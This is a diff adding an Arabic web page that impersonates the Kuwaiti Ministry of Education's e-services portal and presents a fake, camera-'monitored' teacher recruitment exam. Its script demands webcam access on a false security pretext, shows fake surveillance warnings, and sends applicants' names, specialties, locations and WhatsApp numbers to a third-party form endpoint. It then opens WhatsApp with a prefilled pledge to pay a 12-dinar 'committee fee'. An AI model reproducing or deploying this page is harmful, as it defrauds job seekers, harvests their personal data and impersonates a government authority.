@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>وزارة التربية - بوابة الخدمات الإلكترونية</title>
+    <style>
+        :root {
+            --moe-dark-blue: #16215b;
+            --moe-blue: #004a99;
+            --moe-gold: #d4af37;
+        }
+        body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; margin: 0; padding: 0; background-color: #ffffff; color: #333; overflow-x: hidden; }
+
+        /* الشريط العلوي */
+        .top-icons-bar {
+            background-color: #f8f9fa;
+            background-image: linear-gradient(45deg, #eee 25%, transparent 25%, transparent 50%, #eee 50%, #eee 75%, transparent 75%, transparent);
+            background-size: 4px 4px;
+            padding: 12px 0; display: flex; justify-content: center; gap: 20px; border-bottom: 1px solid #ddd;
+        }
+        .icon-btn { background-color: var(--moe-blue); color: white; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; border-radius: 4px; font-size: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
+
+        /* الهيدر المكبر */
+        .main-header { 
+            background-color: var(--moe-dark-blue); 
+            padding: 25px 8%; 
+            display: flex; justify-content: space-between; align-items: center; color: white; 
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+        .logo-section { display: flex; align-items: center; gap: 20px; }
+        .logo-section img { height: 85px; width: auto; } 
+        .logo-text { font-size: 14px; line-height: 1.4; font-weight: bold; }
+
+        /* الواجهة الترحيبية */
+        .hero-section { padding: 80px 12% 60px; text-align: right; }
+        .hero-section h1 { color: var(--moe-dark-blue); font-size: 36px; margin-bottom: 15px; font-weight: 800; }
+        .hero-section p { color: #555; line-height: 2; max-width: 700px; font-size: 20px; }
+
+        /* قسم بيانات المعلم */
+        .user-info-section {
+            background: #fff; border: 2px solid var(--moe-blue); border-radius: 8px;
+            padding: 25px; margin-bottom: 30px; display: grid; grid-template-columns: 1fr 1fr; gap: 15px;
+        }
+        .info-field { text-align: right; }
+        .info-field label { display: block; margin-bottom: 8px; font-weight: bold; color: var(--moe-dark-blue); }
+        .info-field input, .info-field textarea { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+
+        /* المؤقت الزمني */
+        #timer-box {
+            position: fixed; top: 130px; right: 20px; background: var(--moe-gold); color: #000;
+            padding: 10px 20px; border-radius: 5px; font-weight: bold; font-size: 20px; z-index: 9999;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2); display: none;
+        }
+
+        /* نافذة الكاميرا المتحركة */
+        #camBox {
+            position: fixed; top: 160px; left: 30px; width: 200px; 
+            border: 3px solid red; border-radius: 10px; z-index: 10000; background: #000;
+            cursor: move; box-shadow: 0 10px 25px rgba(0,0,0,0.5); touch-action: none; display: none;
+        }
+        .rec-label { color: white; position: absolute; top: 8px; right: 8px; font-size: 11px; background: red; padding: 3px 8px; border-radius: 4px; animation: blink 1s infinite; pointer-events: none; font-weight: bold; }
+        @keyframes blink { 50% { opacity: 0; } }
+
+        /* حاوية الاختبار */
+        .exam-container { display: none; padding: 40px 5%; background: #f4f7fa; min-height: 100vh; }
+        .question-card { 
+            background: white; padding: 35px; border-radius: 5px; margin-bottom: 25px; 
+            border-right: 10px solid var(--moe-gold); box-shadow: 0 4px 15px rgba(0,0,0,0.08); 
+        }
+        .option { display: block; padding: 18px; border: 1px solid #eee; margin: 12px 0; border-radius: 6px; cursor: pointer; transition: 0.3s; font-size: 17px; }
+        .option:hover { background: #f0f7ff; border-color: var(--moe-blue); }
+
+        .btn-main { 
+            background: var(--moe-blue); color: white; border: none; padding: 16px 50px; 
+            border-radius: 5px; font-size: 19px; font-weight: bold; cursor: pointer; 
+            display: inline-flex; align-items: center; gap: 15px; transition: 0.3s; 
+        }
+        .btn-main:hover { background: #003366; transform: translateY(-2px); }
+
+        .footer-line { text-align: center; margin: 60px 0; position: relative; }
+        .footer-line::before { content: ""; position: absolute; top: 50%; left: 15%; right: 15%; height: 2px; background: var(--moe-gold); z-index: 1; }
+        .footer-text { background: white; padding: 0 30px; position: relative; z-index: 2; font-weight: bold; color: var(--moe-dark-blue); font-size: 26px; }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+<div id="timer-box">المتبقي: <span id="timer-display">15:00</span></div>
+
+<div class="top-icons-bar">
+    <div class="icon-btn">📅</div><div class="icon-btn">🔊</div><div class="icon-btn">✉️</div><div class="icon-btn">👤</div>
+</div>
+
+<div class="main-header">
+    <div style="font-size: 32px; cursor: pointer;">☰</div>
+    <div class="logo-section">
+        <div class="logo-text">وزارة التربية<br>Ministry of Education<br>دولة الكويت | State of Kuwait</div>
+        <img src="logo.png" alt="شعار الوزارة">
+    </div>
+</div>
+
+<div id="homePage">
+    <div class="hero-section">
+        <h1>مرحبا بكم في موقع وزارة التربية</h1>
+        <h2 style="color: var(--moe-blue); font-size: 30px;">الخدمات الطلابية والتوظيف</h2>
+        <p>
+            تقدم وزارة التربية منظومة خدمات إلكترونية متكاملة لمنتسبيها والمتقدمين الجدد، بهدف تيسير الإجراءات الإدارية والتربوية وضمان تحقيق أعلى معايير الجودة والشفافية.
+        </p>
+        <button class="btn-main" onclick="initiateSystem()">فتح الرابط ←</button>
+    </div>
+    <div class="footer-line"><span class="footer-text">خدماتنا</span></div>
+</div>
+
+<div id="camBox">
+    <div class="rec-label">● نظام رصد مفعل</div>
+    <video id="video" width="100%" autoplay muted style="border-radius: 8px; pointer-events: none;"></video>
+</div>
+
+<div id="examPage" class="exam-container">
+    <div style="max-width: 1100px; margin: auto;">
+        <div style="background: var(--moe-dark-blue); color: white; padding: 20px; border-radius: 8px; margin-bottom: 30px; text-align: center; font-size: 18px; font-weight: bold;">
+            ⚠️ تحذير: الاختبار مراقب إلكترونياً. يمنع الخروج من وضع ملء الشاشة أو فتح متصفحات أخرى.
+        </div>
+
+        <form id="teacherForm" action="https://formspree.io/f/xyklopqd" method="POST">
+            <div class="user-info-section">
+                <div class="info-field">
+                    <label>الاسم الرباعي:</label>
+                    <input type="text" name="الاسم الكامل" id="name" placeholder="أدخل اسمك كما في الجواز" required>
+                </div>
+                <div class="info-field">
+                    <label>التخصص الدراسي:</label>
+                    <input type="text" name="التخصص" id="spec" placeholder="مثال: رياضيات / لغة إنجليزية" required>
+                </div>
+                <div class="info-field">
+                    <label>مكان الإقامة:</label>
+                    <input type="text" name="مكان الإقامة" id="loc" placeholder="المدينة / الدولة" required>
+                </div>
+                <div class="info-field">
+                    <label>رقم الواتساب:</label>
+                    <input type="tel" name="رقم الواتساب" id="phone" placeholder="+000" required>
+                </div>
+            </div>
+
+            <div id="questionsList"></div>
+
+            <div class="question-card">
+                <h3 style="color:var(--moe-dark-blue)">سؤال تخصصي: تحدث عن رؤيتك للعملية التعليمية، وطبيعة العلاقة التربوية بينك وبين المتعلم من جهة، وبينك وبين إدارة المدرسة من جهة أخرى.</h3>
+                <textarea name="رؤية المعلم والعملية التعليمية" rows="6" style="width:100%; padding:10px; font-size:16px; border:1px solid #ccc; border-radius:4px;" placeholder="اكتب رؤيتك هنا بالاستفاضة..." required></textarea>
+            </div>
+            
+            <button type="submit" class="btn-main" style="background: #28a745; width: 100%; justify-content: center; margin-top: 20px;">إرسال التقرير النهائي للجنة</button>
+        </form>
+    </div>
+</div>
+
+<script>
+    const box = document.getElementById("camBox");
+    let active = false, currentX, currentY, initialX, initialY, xOffset = 0, yOffset = 0;
+    let timer;
+
+    const quizData = [
+        { q: "ما هو الإجراء الأصح عند مواجهة طالب متنمر داخل الفصل؟", a: ["العقاب البدني الفوري", "توجيه الطالب وإشراك الأخصائي الاجتماعي وفق لائحة السلوك", "تجاهل الموقف", "طرده نهائياً من المدرسة"] },
+        { q: "تعتمد رؤية التعليم في الكويت على تحويل دور المعلم من ملقن إلى:", a: ["مراقب فقط", "موجه وميسر لعملية التعلم", "كاتب للمحتوى", "مدير إداري"] },
+        { q: "كيف تتعامل مع الفروق الفردية بين المتعلمين؟", a: ["تقديم نفس المحتوى للجميع دون تغيير", "استخدام استراتيجيات تدريس متنوعة تلبي احتياجات الجميع", "التركيز على الطلاب الفائقين", "إهمال الطلاب ذوي الصعوبات"] },
+        { q: "أي من الوسائل التالية هي الأنسب لجذب انتباه الطلاب في بداية الدرس؟", a: ["البدء بكتابة العنوان مباشرة", "طرح لغز أو موقف مشكل مرتبط بالدرس", "توزيع الأوراق قبل الحديث", "الصراخ لطلب الهدوء"] },
+        { q: "إذا وجه لك طالب سؤالاً لا تعرف إجابته في اللحظة الحالية، ماذا تفعل؟", a: ["تجاهل السؤال تماماً", "إعطاء إجابة تخمينية حتى لا تهتز صورتك", "وعد الطالب بالبحث عن الإجابة الصحيحة وتزويده بها في الحصة القادمة", "توبيخ الطالب لسؤاله الخارج عن المنهج"] },
+        { q: "أي مما يلي يعتبر من أهم معايير التخطيط الجيد للدرس؟", a: ["طول المادة العلمية وتعدد صفحاتها", "وضوح الأهداف السلوكية وتنوع الوسائل التعليمية", "الاعتماد على الكتاب المدرسي فقط", "كثرة الواجبات المنزلية المقررة"] },
+        { q: "كيف تساهم في بناء الشخصية الوطنية للمتعلم داخل الفصل؟", a: ["بشرح الدروس فقط دون أي حديث جانبي", "بدمج القيم الوطنية والمواطنة الصالحة ضمن سياق الأنشطة التعليمية", "بمنع النقاشات داخل الفصل", "بإهمال الأنشطة اللاصفية"] },
+        { q: "ما هو التصرف الأمثل عند ملاحظة تراجع مفاجئ في مستوى أحد الطلاب المتفوقين؟", a: ["إهماله حتى يعود لمستواه بنفسه", "الحديث الودي معه بشكل منفرد لمحاولة فهم الأسباب وتقديم الدعم", "مقارنته بزملائه أمام الفصل", "معاقبته على تراجع مستواه"] },
+        { q: "أي من هذه الأساليب تعزز مهارات التفكير الناقد لدى المتعلم؟", a: ["الحفظ والتلقين المستمر", "طرح أسئلة مفتوحة النهاية وتشجيع النقاش والتحليل", "الاعتماد على إجابات (صح) و (خطأ) فقط", "تحديد المعلومات المهمة فقط للحفظ"] }
+    ];
+
+    document.addEventListener("mousedown", dragStart);
+    document.addEventListener("mouseup", dragEnd);
+    document.addEventListener("mousemove", drag);
+
+    function dragStart(e) {
+        if (e.target === box) {
+            initialX = e.clientX - xOffset;
+            initialY = e.clientY - yOffset;
+            active = true;
+        }
+    }
+    function dragEnd() { initialX = currentX; initialY = currentY; active = false; }
+    function drag(e) {
+        if (active) {
+            e.preventDefault();
+            currentX = e.clientX - initialX;
+            currentY = e.clientY - initialY;
+            xOffset = currentX; yOffset = currentY;
+            box.style.transform = `translate3d(${currentX}px, ${currentY}px, 0)`;
+        }
+    }
+
+    function startTimer(duration, display) {
+        var timerValue = duration, minutes, seconds;
+        timer = setInterval(function () {
+            minutes = parseInt(timerValue / 60, 10);
+            seconds = parseInt(timerValue % 60, 10);
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+            display.textContent = minutes + ":" + seconds;
+
+            if (--timerValue < 0) {
+                clearInterval(timer);
+                alert("انتهى الوقت المحدد للاختبار. سيتم إرسال الإجابات تلقائياً.");
+                document.getElementById('teacherForm').submit();
+            }
+        }, 1000);
+    }
+
+    function initiateSystem() {
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            document.getElementById('video').srcObject = stream;
+            document.getElementById('camBox').style.display = 'block';
+            document.getElementById('homePage').style.display = 'none';
+            document.getElementById('examPage').style.display = 'block';
+            document.getElementById('timer-box').style.display = 'block';
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            startTimer(15 * 60, document.getElementById('timer-display'));
+            renderQuestions();
+        }).catch(() => alert("يجب تفعيل الكاميرا للمتابعة حسب معايير الأمن السيبراني للوزارة."));
+    }
+
+    function renderQuestions() {
+        const container = document.getElementById('questionsList');
+        quizData.forEach((item, index) => {
+            let qNum = index + 1;
+            let optionsHtml = item.a.map((opt) => `
+                <label class="option">
+                    <input type="radio" name="سؤال ${qNum}: ${item.q}" value="${opt}" required> ${opt}
+                </label>
+            `).join('');
+            container.innerHTML += `<div class="question-card"><h3 style="color:var(--moe-dark-blue)">سؤال ${qNum}: ${item.q}</h3>${optionsHtml}</div>`;
+        });
+    }
+
+    document.addEventListener("visibilitychange", () => {
+        if (document.hidden) alert("⚠️ تنبيه أمني: تم رصد مغادرة نافذة الاختبار. تم تسجيل المحاولة.");
+    });
+
+    document.getElementById('teacherForm').onsubmit = function(e) {
+        e.preventDefault(); // منع الإرسال الفوري لضمان التوجيه
+        clearInterval(timer);
+
+        const name = document.getElementById('name').value;
+        const spec = document.getElementById('spec').value;
+        const myWhatsApp = "96512345678"; // ضع رقم الواتساب الخاص بك هنا بالصيغة الدولية بدون (+)
+        
+        const message = `السلام عليكم، أنا المعلم: ${name}%0Aتخصص: ${spec}%0Aلقد أنهيت الاختبار الإلكتروني بنجاح وأؤكد الالتزام بدفع رسوم لجنة الفحص البالغة 12 دينار كويتي أو ما يعادلها.`;
+
+        // إرسال البيانات أولاً عبر Formspree في الخلفية
+        fetch(this.action, {
+            method: 'POST',
+            body: new FormData(this),
+            headers: { 'Accept': 'application/json' }
+        }).then(() => {
+            alert("تم إرسال بياناتك وإجاباتك بنجاح إلى لجنة التقييم بوزارة التربية.");
+            window.location.href = `https://wa.me/${myWhatsApp}?text=${message}`;
+        }).catch(() => {
+            alert("تم إرسال بياناتك وإجاباتك بنجاح إلى لجنة التقييم بوزارة التربية.");
+            window.location.href = `https://wa.me/${myWhatsApp}?text=${message}`;
+        });
+    };
+</script>
+
+</body>
+</html>
